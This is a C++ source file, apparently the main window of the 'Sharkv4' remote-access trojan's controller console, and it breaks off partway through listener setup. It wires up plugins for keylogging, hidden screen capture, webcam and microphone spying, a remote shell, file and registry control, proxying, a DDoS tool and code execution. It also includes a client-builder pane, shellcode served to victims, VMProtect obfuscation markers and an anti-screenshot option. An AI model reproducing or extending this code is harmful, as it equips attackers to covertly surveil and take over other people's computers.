// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "DbgHelp.h"
#include "ISocketBase.h"
#include "QuickView.h"
#include "Quick.h"
#include "MainFrm.h"
#include "TabView.h"

#include "LockDlg.h"			//窗口锁定
#include "ScreenMonitorDlg.h"	//屏幕监控
#include "BuildDlg.h"			//生成设置
#include "LogView.h"			//日志窗口
#include "PlugView.h"			//自动任务
#include "DDOSAttackDlg.h"		//压力测试
#include "ChartView.h"			//系统统计


#include "ShellDlg.h"
#include "Chat.h"
#include "FileManagerDlg.h"
#include "RegeditDlg.h"
#include "SpeakerDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "ProxyMapDlg.h"
#include "DifScreenSpyDlg.h"	
#include "QuickScreenSpyDlg.h"
#include "HideScreenSpyDlg.h"
#include "H264ScreenSpyDlg.h"
#include "KeyBoardDlg.h"
#include "MachineDlg.h"
#include "ExpandDlg.h"

#include "KernelDlg.h"

#include "C_bxsdk.h"
#include "C_avcodec-57.h"
#include "C_avutil-55.h"
#include "C_log.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


extern CScreenMonitorDlg* g_pScreenMonitorDlg;
extern CLogView* g_pLogView;
extern CTabView* g_pTabView;
extern CPlugView* g_pCPlugView;
//extern CDDOSAttackDlg* p_CDDOSAttackDlg;

osIPC::Client* logger;
ISocketBase* g_pSocketBase = new ISocketBase;
CMainFrame* g_pFrame = NULL;


#define IDM_XVID					0x016
#define IDM_REBUILDTOOL				0x017

#define ID_MONITOR_W				0x020
#define ID_MONITOR_SLIDER_W			0x021
#define ID_MONITOR_H				0x022
#define ID_MONITOR_SLIDER_H			0x023
#define ID_MONITOR_F				0x024
#define ID_MONITOR_SLIDER_F			0x025





// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	//ON_WM_TIMER()
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)

	ON_MESSAGE(WM_DESKTOPPOPUP, OnOpenDestopPopup)
	ON_MESSAGE(XTPWM_POPUPCONTROL_NOTIFY, OnPopUpNotify)

	ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)		//托盘菜单 显示	
	ON_COMMAND(ID_TRY_LOCK, OnLockButton)				//托盘菜单  锁屏
	ON_COMMAND(ID_TRY_HIDDEN, OnHiddenButton)				//托盘菜单  反截图

	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenshelldialog)							//终端管理
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenkeyboarddialog)						//键盘
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenregeditdialog)						//注册表
	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenproxydialog)							//代理
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenchatdialog)								//远程交谈
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenaudiodialog)							//GSM麦克风
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenmanagerdialog)						//文件管理
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenwebcamdialog)							//摄像头
	ON_MESSAGE(WM_OPENSPEAKERDIALOG, OnOpenspeakerdialog)						//扬声器
	ON_MESSAGE(WM_OPENSYSINFODIALOG, OnOpensysinfodialog)						//系统管理
	ON_MESSAGE(WM_OPENPKERNELDIALOG, OnOpenkerneldialog)						//驱动插件
	ON_MESSAGE(WM_OPENPEXPANDDIALOG, OnOpenexpanddialog)						//互动插件

	ON_MESSAGE(WM_OPENSCREENSPYDIALOG_DIF, OnOpencreenspydialog_dif)			//差异屏幕
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG_QUICK, OnOpencreenspydialog_quick)		//高速屏幕
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG_PLAY, OnOpencreenspydialog_play)			//娱乐屏幕
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG_HIDE, OnOpencreenspydialog_hide)			//后台屏幕

	ON_COMMAND(ID_MONITOR_W, OnButton_Monitor_W)	// 宽度设置
	ON_NOTIFY(XTP_SBN_SCROLL, ID_MONITOR_SLIDER_W, OnZoomSliderScroll_W)
	ON_COMMAND(ID_MONITOR_H, OnButton_Monitor_H)	//高度设置
	ON_NOTIFY(XTP_SBN_SCROLL, ID_MONITOR_SLIDER_H, OnZoomSliderScroll_H)
	ON_COMMAND(ID_MONITOR_F, OnButton_Monitor_F)	//刷新设置
	ON_NOTIFY(XTP_SBN_SCROLL, ID_MONITOR_SLIDER_F, OnZoomSliderScroll_F)

END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,           // status line indicator
};

struct PLUGINS
{
	TCHAR DllPath[50];
	int RType;
	bool buildshellcode;
	char param[50];
};

PLUGINS plugins_Dates_32[] =
{
{ _T("播放监听.dll"), IDR_PLUGINS1 ,true,"0"},
{ _T("查注册表.dll"), IDR_PLUGINS2 ,true,"0"},
{ _T("差异屏幕.dll"), IDR_PLUGINS3 ,true,"0"},
{ _T("代理映射.dll"), IDR_PLUGINS4 ,true,"0"},
{ _T("高速屏幕.dll"), IDR_PLUGINS5 ,true,"0"},
{ _T("后台屏幕.dll"), IDR_PLUGINS6 ,true,"0"},
{ _T("键盘记录.dll"), IDR_PLUGINS7 ,true,"0"},
{ _T("上线模块.bin"), IDR_PLUGINS8,false,"0"},
{ _T("上线模块.dll"), IDR_PLUGINS9,true,"load"},
{ _T("视频查看.dll"), IDR_PLUGINS10,true,"0"},
{ _T("文件管理.dll"), IDR_PLUGINS11,true,"0"},
{ _T("系统管理.dll"), IDR_PLUGINS12,true,"0"},
{ _T("语音监听.dll"), IDR_PLUGINS13,true,"0"},
{ _T("远程交谈.dll"), IDR_PLUGINS14,true,"0"},
{ _T("远程终端.dll"), IDR_PLUGINS15,true,"0"},
{ _T("娱乐屏幕.dll"), IDR_PLUGINS16,true,"0"},
{ _T("压力测试.dll"), IDR_PLUGINS17,true,"0"},
{ _T("登录模块.dll"), IDR_PLUGINS18,true,"0"},
{ _T("驱动插件.dll"), IDR_PLUGINS19,true,"0"},
{ _T("执行代码.dll"), IDR_PLUGINS20,false,"0"},

};

PLUGINS plugins_Dates_64[] =
{
{ _T("播放监听.dll"), IDR_PLUGINS641,true,"0"},
{ _T("查注册表.dll"), IDR_PLUGINS642,true,"0"},
{ _T("差异屏幕.dll"), IDR_PLUGINS643,true,"0"},
{ _T("代理映射.dll"), IDR_PLUGINS644,true,"0"},
{ _T("高速屏幕.dll"), IDR_PLUGINS645,true,"0"},
{ _T("后台屏幕.dll"), IDR_PLUGINS646,true,"0"},
{ _T("键盘记录.dll"), IDR_PLUGINS647,true,"0"},
{ _T("上线模块.bin"), IDR_PLUGINS648,false,"0"},
{ _T("上线模块.dll"), IDR_PLUGINS649,true,"load"},
{ _T("视频查看.dll"), IDR_PLUGINS6410,true,"0"},
{ _T("文件管理.dll"), IDR_PLUGINS6411,true,"0"},
{ _T("系统管理.dll"), IDR_PLUGINS6412,true,"0"},
{ _T("语音监听.dll"), IDR_PLUGINS6413,true,"0"},
{ _T("远程交谈.dll"), IDR_PLUGINS6414,true,"0"},
{ _T("远程终端.dll"), IDR_PLUGINS6415,true,"0"},
{ _T("娱乐屏幕.dll"), IDR_PLUGINS6416,true,"0"},
{ _T("压力测试.dll"), IDR_PLUGINS6417,true,"0"},
{ _T("登录模块.dll"), IDR_PLUGINS6418,true,"0"},
{ _T("驱动插件.dll"), IDR_PLUGINS6419,true,"0"},
{ _T("执行代码.dll"), IDR_PLUGINS642,false,"0"},

};

static UINT uHideCmds[] =
{
	ID_FILE_PRINT,
	ID_FILE_PRINT_PREVIEW,
};

bool pid_is_running(DWORD pid) {

	HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	if (h_process == NULL) {
		printf("Unable to check if process %d is running.\n", (int)pid);
		return false;
	}

	DWORD exit_code;
	if (!GetExitCodeProcess(h_process, &exit_code)) {
		printf("Unable to check if process %d is running.\n", (int)pid);
		return false;
	}

	if (exit_code == STILL_ACTIVE) {
		return true;
	}
	else {
		return false;
	}
}

DWORD WINAPI ThreadProc(_In_ LPVOID lpParameter)
{
	PROCESS_INFORMATION* pi = (PROCESS_INFORMATION*)lpParameter;
	do
	{
		if (pid_is_running(pi->dwProcessId))
		{
			Sleep(300);
		}
		else
		{
			AfxMessageBox(_T("日志进程不存在,结束进程"));
			if (logger) 	delete logger;
			ExitProcess(0);
		}

	} while (1);


	return 0;
}


int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)
{
	OUT_PUT_FUNCION_NAME_INFO
		log_严重("崩溃");
	// 定义函数指针
	typedef BOOL(WINAPI* MiniDumpWriteDumpT)(
		HANDLE,
		DWORD,
		HANDLE,
		MINIDUMP_TYPE,
		PMINIDUMP_EXCEPTION_INFORMATION,
		PMINIDUMP_USER_STREAM_INFORMATION,
		PMINIDUMP_CALLBACK_INFORMATION
		);
	// 从 "DbgHelp.dll" 库中获取 "MiniDumpWriteDump" 函数
	MiniDumpWriteDumpT pfnMiniDumpWriteDump = NULL;
	HMODULE hDbgHelp = LoadLibrary((_T("DbgHelp.dll")));
	if (NULL == hDbgHelp)
	{
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	pfnMiniDumpWriteDump = (MiniDumpWriteDumpT)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

	if (NULL == pfnMiniDumpWriteDump)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// 创建 dmp 文件件
	TCHAR szFileName[MAX_PATH] = { 0 };
	TCHAR* szVersion = _T("!analyze -v");
	SYSTEMTIME stLocalTime;
	GetLocalTime(&stLocalTime);
	wsprintf(szFileName, _T("%s-%04d%02d%02d-%02d%02d%02d.dmp"),
		szVersion, stLocalTime.wYear, stLocalTime.wMonth, stLocalTime.wDay,
		stLocalTime.wHour, stLocalTime.wMinute, stLocalTime.wSecond);
	HANDLE hDumpFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (INVALID_HANDLE_VALUE == hDumpFile)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// 写入 dmp 文件
	MINIDUMP_EXCEPTION_INFORMATION expParam = {};
	expParam.ThreadId = GetCurrentThreadId();
	expParam.ExceptionPointers = pExceptionPointers;
	expParam.ClientPointers = FALSE;
	pfnMiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),
		hDumpFile, MiniDumpWithDataSegs, (pExceptionPointers ? &expParam : NULL), NULL, NULL);
	// 释放文件
	CloseHandle(hDumpFile);
	FreeLibrary(hDbgHelp);

	return EXCEPTION_EXECUTE_HANDLER;
}

LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)
{
	OUT_PUT_FUNCION_NAME_INFO
		// 这里做一些异常的过滤或提示
		if (IsDebuggerPresent())
		{
			return EXCEPTION_CONTINUE_SEARCH;
		}
	return GenerateMiniDump(lpExceptionInfo);

}


// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	//崩溃写出
	SetUnhandledExceptionFilter(ExceptionFilter);
	g_pFrame = this;
	m_ptPopup = CPoint(-1, -1);

	//初始化屏幕墙参数
	m_nZoom_w = 300;
	m_nZoom_h = 200;
	m_nZoom_f = 1000;

	bbusy = true;
	//初始化虚拟功能
	HMEMORYMODULE handle = ::MemoryLoadLibrary(bxsdk32MyFileBuf, bxsdk32MyFileSize);
	if (handle != NULL)
	{
		MyBoxedAppSDK_SetContext = (fuBoxedAppSDK_SetContext)MemoryGetProcAddress(handle, "BoxedAppSDK_SetContext");
		MyBoxedAppSDK_Init = (fuBoxedAppSDK_Init)MemoryGetProcAddress(handle, "BoxedAppSDK_Init");
		MyBoxedAppSDK_SetBxSdkRawData = (fuBoxedAppSDK_SetBxSdkRawData)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdkRawData");
		MyBoxedAppSDK_Exit = (fuBoxedAppSDK_Exit)MemoryGetProcAddress(handle, "BoxedAppSDK_Exit");
		MyBoxedAppSDK_CreateVirtualFileW = (fuBoxedAppSDK_CreateVirtualFileW)MemoryGetProcAddress(handle, "BoxedAppSDK_CreateVirtualFileW");
		MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW = (fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW)MemoryGetProcAddress(handle, "BoxedAppSDK_DeleteFileFromVirtualFileSystemW");
		MyBoxedAppSDK_EnableOption = (fuBoxedAppSDK_EnableOption)MemoryGetProcAddress(handle, "BoxedAppSDK_EnableOption");
		MyBoxedAppSDK_RemoteProcess_EnableOption = (fuBoxedAppSDK_RemoteProcess_EnableOption)MemoryGetProcAddress(handle, "BoxedAppSDK_RemoteProcess_EnableOption");
		MyBoxedAppSDK_AttachToProcess = (fuBoxedAppSDK_AttachToProcess)MemoryGetProcAddress(handle, "BoxedAppSDK_AttachToProcess");
		MyBoxedAppSDK_DetachFromProcess = (fuBoxedAppSDK_DetachFromProcess)MemoryGetProcAddress(handle, "BoxedAppSDK_DetachFromProcess");
		MyBoxedAppSDK_EmulateBoxedAppSDKDLL = (fuBoxedAppSDK_EmulateBoxedAppSDKDLL)MemoryGetProcAddress(handle, "BoxedAppSDK_EmulateBoxedAppSDKDLL");
		MyBoxedAppSDK_SetBxSdk64DllPathW = (fuBoxedAppSDK_SetBxSdk64DllPathW)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdk64DllPathW");
		MyBoxedAppSDK_SetBxSdk32DllPathW = (fuBoxedAppSDK_SetBxSdk32DllPathW)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdk32DllPathW");
		MyBoxedAppSDK_EnableDebugLog = (fuBoxedAppSDK_EnableDebugLog)MemoryGetProcAddress(handle, "BoxedAppSDK_EnableDebugLog");
		(*MyBoxedAppSDK_SetContext)(INITCODE);
		BoxedAppSDK_Init_IsOK = (*MyBoxedAppSDK_Init)();
		if (!BoxedAppSDK_Init_IsOK)
		{
			ExitProcess(0);
			delete g_pFrame;
		}
		(*MyBoxedAppSDK_SetBxSdkRawData)(bxsdk32MyFileBuf, bxsdk32MyFileSize);
		(*MyBoxedAppSDK_EmulateBoxedAppSDKDLL)();
		(*MyBoxedAppSDK_EnableOption)(2, TRUE);
	}
	else
	{
		ExitProcess(0);
		delete g_pFrame;
	}

	//写出必要DLL
	TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString str_path = strSelf;
	str_path = str_path.Mid(0, str_path.ReverseFind('\\'));
	VMPSTAR
		CString str_screenshot, str_avcode, str_avutil, str_skin, str_log_Path;

	str_screenshot = str_path + _T("\\screenshot");
	str_avcode = str_path + _T("\\avcodec-57.dll");
	str_avutil = str_path + _T("\\avutil-55.dll");
	str_log_Path = str_path + _T("\\Quick_日志记录.exe");
	DWORD dwTemp = 0;
	::CreateDirectory(str_screenshot, NULL);
	HANDLE h_avcodefile = (*MyBoxedAppSDK_CreateVirtualFileW)(str_avcode, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	WriteFile(h_avcodefile, avcodecMyFileBuf, avcodecMyFileSize, &dwTemp, NULL);
	HANDLE h_avutilfile = (*MyBoxedAppSDK_CreateVirtualFileW)(str_avutil, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	WriteFile(h_avutilfile, avutil55MyFileBuf, avutil55MyFileSize, &dwTemp, NULL);
	HANDLE h_logfile = (*MyBoxedAppSDK_CreateVirtualFileW)(str_log_Path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	WriteFile(h_logfile, logMyFileBuf, logMyFileSize, &dwTemp, NULL);
	VMPEND
		//创建记事本进程
		PROCESS_INFORMATION* pi = new PROCESS_INFORMATION;
	STARTUPINFO si = { sizeof(si) };

#if _DEBUG

#else
	str_log_Path = _T("Quick_日志记录.exe");
#endif

	// 启动子进程
	BOOL ret = CreateProcess(NULL, str_log_Path.GetBuffer(), NULL, NULL, FALSE, 0, NULL, NULL, &si, pi);
	DWORD iPid = GetCurrentProcessId();
	//初始化日志
	for (int i = 0; i < 50; i++)
	{
		char temp_char[10] = {};
		_itoa_s(pi->dwProcessId, temp_char, 10);
		logger = new osIPC::Client(temp_char);
		if (logger->IsOk())
		{
			HANDLE hThread;
			hThread = CreateThread(NULL, 0, ThreadProc, pi, 0, NULL);
			CloseHandle(hThread);
			break;
		}
		else
		{
			SAFE_DELETE(logger);
			Sleep(100);
			if (i > 45)
			{
				AfxMessageBox(_T("日志进程打开失败,结束进程"));
				exit(0);
			}
		}
	}
	char szFilePath[MAX_PATH] = { 0 }, szDrive[MAX_PATH] = { 0 }, szDir[MAX_PATH] = { 0 }, szFileName[MAX_PATH] = { 0 }, szExt[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, szFilePath, sizeof(szFilePath));
	_splitpath_s(szFilePath, szDrive, szDir, szFileName, szExt);
	CStringA str(szDrive);
	str = str + szDir + "Log\\";
	int loginfosize = sizeof(DWORD) + str.GetLength() + 1;
	void* buff = new char[sizeof(logInfo)];
	ZeroMemory(buff, sizeof(logInfo));
	memcpy(buff, &iPid, sizeof(DWORD));
	memcpy((char*)buff + sizeof(DWORD), str.GetBuffer(), str.GetLength() + 1);
	logger->write(buff, loginfosize);
	SAFE_DELETE_AR(buff);
	CString titlestr = _T("  程序BUG查询使用   ");
	logger->write(titlestr, 4);
	titlestr.Format(_T("日志进程PID %d   请勿关闭"), pi->dwProcessId);
	logger->write(titlestr, 3);



	//写出一些需要的文件	//初始化插件数据
	WriteandReadPlugins();


	//初始化shellcode
	InitShellcode();

}


CMainFrame::~CMainFrame()
{
	SAFE_DELETE(logger);
	SAFE_DELETE(m_gQQwry);
	while (!m_lstPopupControl.IsEmpty())
	{
		delete m_lstPopupControl.RemoveTail();
	}
	_CrtDumpMemoryLeaks();
}




int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		OUT_PUT_FUNCION_NAME_ERROR
			TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	VMPSTAR



	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2015);
	m_paneManager.InstallDockingPanes(this);
	XTPPaintManager()->RefreshMetrics();
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005Beta2); // 设置主题xtpPaneThemeWinExplorer xtpPaneThemeVisualStudio2005Beta2
	pwndPanelist = CreatePane(250, 25, RUNTIME_CLASS(CPeneListView), _T("首页列表"), xtpPaneDockBottom);
	pwndPanemonitor = CreatePane(250, 25, RUNTIME_CLASS(CScreenMonitorDlg), _T("屏幕监控"), xtpPaneDockBottom, pwndPanelist);
	m_paneManager.AttachPane(pwndPanemonitor, pwndPanelist);
	pwndPaneLog = CreatePane(250, 25, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom, pwndPanemonitor);
	m_paneManager.AttachPane(pwndPaneLog, pwndPanemonitor);
	pwndPanePlug = CreatePane(250, 25, RUNTIME_CLASS(CPlugView), _T("插件管理"), xtpPaneDockBottom, pwndPaneLog);
	m_paneManager.AttachPane(pwndPanePlug, pwndPaneLog);
	pwndPaneBuild = CreatePane(250, 25, RUNTIME_CLASS(CBuildDlg), _T("客户生成"), xtpPaneDockBottom, pwndPanePlug);
	m_paneManager.AttachPane(pwndPaneBuild, pwndPanePlug);
	

	m_paneManager.LockSplitters();

	pwndPanelist->SetOptions(xtpPaneNoCloseable | xtpPaneNoFloatable | xtpPaneNoCaption | xtpPaneNoHideable);
	pwndPanemonitor->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);
	pwndPaneLog->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);
	pwndPanePlug->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);
	pwndPaneBuild->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);

	pwndPanemonitor->Hide();
	pwndPaneLog->Hide();
	pwndPanePlug->Hide();
	pwndPaneBuild->Hide();

	pwndPanelist->Select();
	m_paneManager.HideClient(FALSE);

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL, 1);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 60);
	m_wndStatusBar.SetRibbonDividerIndex(m_wndStatusBar.GetPaneCount());

	pPaneW = m_wndStatusBar.AddIndicator(ID_MONITOR_W, 2);			//视频墙 宽度
	pPaneW->SetText(_T("宽度300  "));
	pPaneW->SetWidth(pPaneW->GetBestFit());
	pPaneW->SetButton();
	pPaneW->SetTextAlignment(DT_CENTER);
	pPaneW->SetTooltip(_T("点击设置列数，自动计算宽度"));
	pPaneW->SetBeginGroup(FALSE);

	pZoomPaneW = (CXTPStatusBarSliderPane*)m_wndStatusBar.AddIndicator(new CXTPStatusBarSliderPane(), ID_MONITOR_SLIDER_W, 3);	//视频墙 宽度
	pZoomPaneW->SetWidth(XTP_DPI_X(130));
	pZoomPaneW->SetPos(300);
	pZoomPaneW->SetRange(100, 1000);
	pZoomPaneW->SetStyle(SBPS_NOBORDERS);
	pZoomPaneW->SetBeginGroup(FALSE);
	pZoomPaneW->SetCaption(_T("&Zoom Slider"));
	pZoomPaneW->SetTooltip(_T("直接设置宽度"));


	pPaneH = m_wndStatusBar.AddIndicator(ID_MONITOR_H, 4);			//视频墙 高度
	pPaneH->SetText(_T("高度200  "));
	pPaneH->SetWidth(pPaneH->GetBestFit());
	pPaneH->SetButton();
	pPaneH->SetTextAlignment(DT_CENTER);
	pPaneH->SetTooltip(_T("点击设置排数，自动计算高度"));
	pPaneH->SetBeginGroup(FALSE);

	pZoomPaneH = (CXTPStatusBarSliderPane*)m_wndStatusBar.AddIndicator(new CXTPStatusBarSliderPane(), ID_MONITOR_SLIDER_H, 5);	//视频墙 宽度
	pZoomPaneH->SetWidth(XTP_DPI_X(130));
	pZoomPaneH->SetPos(200);
	pZoomPaneH->SetRange(100, 1000);
	pZoomPaneH->SetStyle(SBPS_NOBORDERS);
	pZoomPaneH->SetBeginGroup(FALSE);
	pZoomPaneH->SetCaption(_T("&Zoom Slider"));
	pZoomPaneH->SetTooltip(_T("直接设置高度"));

	pPaneF = m_wndStatusBar.AddIndicator(ID_MONITOR_F, 6);			//视频墙 高度
	pPaneF->SetText(_T("刷新1.00s"));
	pPaneF->SetWidth(pPaneF->GetBestFit());
	pPaneF->SetButton();
	pPaneF->SetTextAlignment(DT_CENTER);
	pPaneF->SetTooltip(_T("点击设置刷新时间"));
	pPaneF->SetBeginGroup(FALSE);

	pZoomPaneF = (CXTPStatusBarSliderPane*)m_wndStatusBar.AddIndicator(new CXTPStatusBarSliderPane(), ID_MONITOR_SLIDER_F, 7);	//视频墙 宽度
	pZoomPaneF->SetWidth(XTP_DPI_X(130));
	pZoomPaneF->SetPos(1000);
	pZoomPaneF->SetRange(50, 3000);
	pZoomPaneF->SetStyle(SBPS_NOBORDERS);
	pZoomPaneF->SetBeginGroup(FALSE);
	pZoomPaneF->SetCaption(_T("&Zoom Slider"));
	pZoomPaneF->SetTooltip(_T("直接设置刷新时间"));



	m_wndStatusBar.SetPaneInfo(8, m_wndStatusBar.GetItemID(8), SBPS_NORMAL, 60);
	m_wndStatusBar.SetPaneInfo(9, m_wndStatusBar.GetItemID(9), SBPS_STRETCH, NULL);

	m_wndStatusBar.SetPaneInfo(10, m_wndStatusBar.GetItemID(10), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(11, m_wndStatusBar.GetItemID(11), SBPS_NORMAL, 100);

	showStatusBar(FALSE);
	VMPEND

		CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		//pSysMenu->DeleteMenu(SC_TASKLIST, MF_BYCOMMAND);
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_XVID, _T("安装XVID"));
#ifdef TOOLBAR_OPEN
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_REBUILDTOOL, _T("重置工具栏"));
#endif // TOOLBAR_OPEN



	}
	this->SetMenu(NULL);

#ifdef TOOLBAR_OPEN
	if (!adddCXTPToolBar())
	{
		OUT_PUT_FUNCION_NAME_FATAL
			return -1;
	}
#endif // TOOLBAR_OPEN


	// Set Office 2003 Theme
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2015);


	EnableDocking(CBRS_ALIGN_ANY);



	// 创建托盘图标
	if (!m_TrayIcon.Create(_T("Sharkv4"), // 提示文本
		this,                       // 父窗口
		IDR_MAINFRAME,              // 托盘图标ID
		IDR_MENU_TRAY,              // 右键菜单ID
		ID_MENUITEM_SHOW,           // 默认单击事件
		false))                     // 如果默认菜单项按位置定位，则为真
	{
		OUT_PUT_FUNCION_NAME_FATAL
			TRACE0("Failed to create tray icon\n");
		return -1;
	}



	LoadCommandBars(((CQuickApp*)AfxGetApp())->g_Exename);



	//初始化tip窗口
	log_信息("初始化tip窗口");
	if (!m_wndTip.Create(this))
	{
		log_信息("初始化tip窗口失败");
		OnClose();
	}

#ifdef ANTISCREENSHOT

	typedef BOOL(__stdcall* SetWindowDisplayAffinity)(HWND  hWnd, DWORD dwAffinity);
	SetWindowDisplayAffinity fnSetWindowDisplayAffinity;
	HINSTANCE	User32handle = ::LoadLibrary(_T("User32.dll"));
	if (User32handle != NULL)
	{
		fnSetWindowDisplayAffinity = (SetWindowDisplayAffinity)GetProcAddress(User32handle, "SetWindowDisplayAffinity");
		if (fnSetWindowDisplayAffinity)
		{
			HWND handle = this->GetSafeHwnd();
			fnSetWindowDisplayAffinity(handle, 0x00000000); //0x00000000
		}
	}
#endif // ANTISCREENSHOT

	return 0;
}

CDialogBar* CMainFrame::CreatewndFilterEdit()
{
	// Initialize dialog bar m_wndFilterEdit
	CDialogBar* m_wndFilterEdit = new CDialogBar;     // Sample Filter editing window
	if (!m_wndFilterEdit->Create(this, IDD_FILTEREDIT, CBRS_LEFT | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_HIDE_INPLACE, ID_TEST_FILTERWINDOW))
	{
		OUT_PUT_FUNCION_NAME_FATAL
			return NULL;      // fail to create
	}
	// docking for filter editing
	m_wndFilterEdit->EnableDocking(0);
	m_wndFilterEdit->SetWindowText(_T("过滤器"));
	ShowControlBar(m_wndFilterEdit, FALSE, FALSE);
	FloatControlBar(m_wndFilterEdit, CPoint(400, GetSystemMetrics(SM_CYSCREEN) / 3));
	return m_wndFilterEdit;
}

void CMainFrame::Activate()
{
	OUT_PUT_FUNCION_NAME_INFO

		initializeSEU_QQwry();

	g_pLogView->InsertLogItem(_T("运行"), _T("Sharkv4"));

	//TAB 设置默认组
	g_pTabView->AddGroup(_T("默认(0)"));
	g_pTabView->m_wndTabControl.SetCurSel(0);

	//初始化powershell数据
	if (!CBuildDlg::initpowershellcode())
	{
		// AfxMessageBox(_T("PowerShell未初始化。"));
	}

	log_信息("通信初始化");
	//通信初始化
	//读取配置并显示
	HKEY hKEY;
	BYTE* B_portinfo = new BYTE[65535];
	portinfo* m_portinfo = new portinfo;
	serverstartdate m_serverstartdate;

	m_wndStatusBar.SetPaneText(1, _T("监听成功"));
	bAddListen = 0;
	if (ShellcodeSize32 > 0 && ShellcodeSize64 > 0)
	{
		CHpUdpServer::Shellcode32 = Shellcode32;
		CHpUdpServer::ShellcodeSize32 = ShellcodeSize32;
		CHpUdpServer::Shellcode64 = Shellcode64;
		CHpUdpServer::ShellcodeSize64 = ShellcodeSize64;
	}
	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_READ, &hKEY))
	{
		DWORD dwSize = 65535;
		DWORD dwType = REG_BINARY;
		if (::RegQueryValueEx(hKEY, _T("IpDate"), 0, &dwType, (LPBYTE)B_portinfo, &dwSize) == ERROR_SUCCESS)
		{
			int m_num, site;
			site = sizeof(int);
			memcpy(&m_num, B_portinfo, site);
			if (m_num > 0)
			{
				for (int i = 0; i < m_num; i++)
				{
					ZeroMemory(m_portinfo, sizeof(portinfo));
					memcpy(m_portinfo, B_portinfo + i * sizeof(portinfo) + site, sizeof(portinfo));
					m_serverstartdate.ip.Format(_T("%s"), m_portinfo->ip);
					m_serverstartdate.m_net.Format(_T("%s"), m_portinfo->m_net);
					m_serverstartdate.port.Format(_T("%s"), m_portinfo->port);
					if (!g_pSocketBase->Addserver(NotifyProc, this, &m_serverstartdate))
					{
